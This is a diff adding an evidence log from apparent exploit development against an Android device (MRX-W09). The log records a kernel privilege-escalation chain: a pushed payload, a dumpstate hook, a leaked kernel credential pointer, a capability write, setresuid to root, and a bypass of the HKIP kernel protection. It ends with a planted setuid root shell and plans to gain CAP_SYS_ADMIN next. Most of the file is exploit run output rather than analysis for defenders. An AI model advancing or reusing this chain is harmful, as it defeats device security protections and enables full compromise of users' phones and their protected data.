@@ -1,0 +1,49 @@
+CHANGE 01 evidence — shield-free legal root (MRX-W09, 2026-09-26)
+=================================================================
+Device: MRX-W09 / 11.0.0.235(C635E3R1P6) / shell uid 2000 / u:r:shell:s0
+Setup : cold boot -> cleared markers -> pushed payload.bin 772B (ph=0x300) +
+        perf-only glboot.sh -> inject_hook place/hook -> ONE bugreportz trigger
+        -> perf=-1 (gl.exp.log: uid=0 ctx=u:r:dumpstate:s0 perf_after=-1)
+        -> `ghostlock_e --freeze` (parks; NO pid-0 shield) -> permissive LIVE
+           freeze: ACCESS-ORACLE@1C0 flags kernel=0 shell=1 (bit0=AVD_FLAGS_PERMISSIVE)
+
+--- change: new mode --legalroot (session src), reliable x25 cred leak ---
+--- run 1 (persist_proof had an unquoted '(' in its echo -> mksh parse error) ---
+legalroot: C=0xffffffcedbbfe300
+legalroot: cap_effective w=0 value=0xffffffcf54017c90 low=90
+[*] legalroot capget r=0 eff=ffffffcf54017c90 SETUID=1
+[*] legalroot setresuid(0,0,1) -> r=0 errno=0 uid=0
+[+] legalroot: UID 0 -> commit_creds -> HKIP bit (LEGAL ROOT, exit-safe)
+sh: syntax error: unexpected '('   (persist_proof bug; device stayed up)
+
+--- fix: quote the echo in persist_proof(); run 2 (clean) ---
+legalroot: C=0xffffffceec129b40
+[y] arm waiter_abs=0xffffffcedb31bcf0
+legalroot: cap_effective w=0 value=0xffffffcedb31bc90 low=90
+[*] legalroot capget r=0 eff=ffffffcedb31bc90 SETUID=1
+[*] legalroot setresuid(0,0,1) -> r=0 errno=0 uid=0
+[+] legalroot: UID 0 -> commit_creds -> HKIP bit (LEGAL ROOT, exit-safe)
+ret=0
+proof: -rw-rw-rw- 1 0 2000 409 /data/local/tmp/rooted.txt
+       === GHOSTLOCK rooted (HKIP neutralised) ===
+       uid=0(root) gid=2000(shell) ... context=u:r:shell:s0
+       -rwsr-xr-x 1 root shell 303720 /data/local/tmp/rsh
+device: uptime continued (8 min); `ps | grep ghostlock` shows ONLY the parked
+        --freeze process (6252); the --legalroot process EXITED (no for(;;) park).
+
+--- conclusion ---
+[A1] A task with NO pid-0 shield reached uid=0 (setresuid(0,0,1) r=0) through
+     permissive(shell) + cap_effective(CAP_SETUID) -> commit_creds ->
+     hkip_update_xid_root -> its own HKIP bit.               [MEASURED]
+[A2] That task EXITED normally with NO kernel panic and NO reboot. [MEASURED]
+[A3] Why this matters: the panic in FACTS 9an(169)/(170) comes from the pid-0
+     shield (do_exit panic, TASK_PID0_RISK). Removing the shield removes the
+     landmine. This run is the shield-free counterpart.        [MEASURED]
+
+--- notes / limits ---
+- `ls /data/misc/keystore` -> Permission denied: cap_effective has ONLY CAP_SETUID
+  (bit7), so uid 0 without CAP_DAC_OVERRIDE cannot bypass DAC. For mount we still
+  need CAP_SYS_ADMIN (bit21) in cap_effective (a second write, already the design
+  of --root). This does not affect the shield-free claim.
+- The integration into --root (freeze in-process + this cap/setresuid instead of
+  the shield) is the next change; it is NOT yet done.
